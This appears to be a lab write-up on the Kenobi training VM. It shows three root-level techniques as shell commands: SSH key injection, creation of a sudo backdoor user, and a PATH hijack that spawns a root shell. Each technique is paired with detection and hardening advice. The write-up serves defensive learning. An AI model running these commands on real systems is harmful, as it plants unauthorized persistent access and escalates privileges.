# Day 5 ‚Äì Attack vs Defense

### Target
- Kenobi VM (Ubuntu 20.04.6 LTS)  
- Root access achieved via PATH hijack in `/usr/bin/menu`

---

## üîí Persistence Techniques

### 1Ô∏è‚É£ SSH Key Injection
**Description:** Added a public key to root's `authorized_keys` to allow remote root login.

**Command Example:**
```bash
mkdir -p /root/.ssh
echo "<attacker-public-key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Defense:**
- Monitor `/root/.ssh/authorized_keys` for unauthorized changes.  
- Check `/var/log/auth.log` for suspicious SSH key additions.  

---

### 2Ô∏è‚É£ Backdoor User Creation
**Description:** Created a new sudo-enabled user for persistence.

**Command Example:**
```bash
useradd -m -s /bin/bash eviluser
echo "eviluser:password123" | chpasswd
usermod -aG sudo eviluser
```

**Defense:**
- Audit `/etc/passwd` and `/etc/shadow` regularly.  
- Monitor `/var/log/auth.log` for unexpected logins.  

---

### 3Ô∏è‚É£ PATH Hijack Exploit
**Description:** Exploited a root-owned script (`/usr/bin/menu`) by prepending `/tmp` to `$PATH`.

**Steps:**
```bash
echo "/bin/sh" > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

**Outcome:** Spawned a root shell.

**Defense:**
- Avoid using relative paths in SUID/root scripts.  
- Monitor `/tmp` for unexpected executables.  
- Remove or restrict unnecessary SUID binaries.  

---

## üõ° Detection & Mitigation

**Audit Tools:**  
- `auditd` can track execution of binaries in `/tmp`.

**Log Monitoring:**  
- `/var/log/auth.log` ‚Üí detects unauthorized SSH keys and new user logins.  
- `/var/log/syslog` ‚Üí monitors suspicious system calls.  

**System Hardening:**  
- Patch known vulnerabilities (e.g., `pkexec` CVE-2021-4034).  
- Use AppArmor/SELinux to restrict execution.  
- File integrity monitoring (e.g., AIDE, Tripwire) for critical files like `/etc/passwd` and `/root/.ssh`.  

---

## üìù Summary
This session demonstrated root escalation and persistence techniques on Kenobi VM. The focus was on understanding attack methods and corresponding defense mechanisms. Implementing **logging, monitoring, and system hardening** can help prevent such compromises in real-world environments.
